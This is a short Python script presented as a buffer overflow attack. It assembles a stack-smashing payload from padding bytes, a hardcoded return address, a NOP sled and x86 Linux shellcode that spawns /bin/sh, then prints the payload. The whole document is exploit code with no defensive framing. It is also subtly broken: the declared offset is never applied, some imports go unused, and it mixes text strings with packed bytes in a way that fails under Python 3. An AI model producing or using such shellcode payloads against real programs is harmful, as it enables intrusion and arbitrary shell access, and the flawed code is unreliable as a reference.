# buffer overflow attack

import sys
import struct
from ctypes import *
def create_buffer(size):
    buffer = ""
    for i in range(size):
        buffer += "A"
    return buffer

def main():
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" \
                "\x68\x68\x2f\x62\x69\x6e\x89" \
                "\xe3\x89\xc1\x89\xc2\xb0\x0b" \
                "\xcd\x80\x31\xc0\x40\xcd\x80"
    size = 300
    offset = 260
    buffer = create_buffer(size)
    ret = 0xbffff1d0 + 50
    eip = struct.pack("<I", ret)
    nops = "\x90" * 16
    buffer = buffer + eip + nops + shellcode
    print(buffer)
    print(len(buffer))
    print("Done!")

    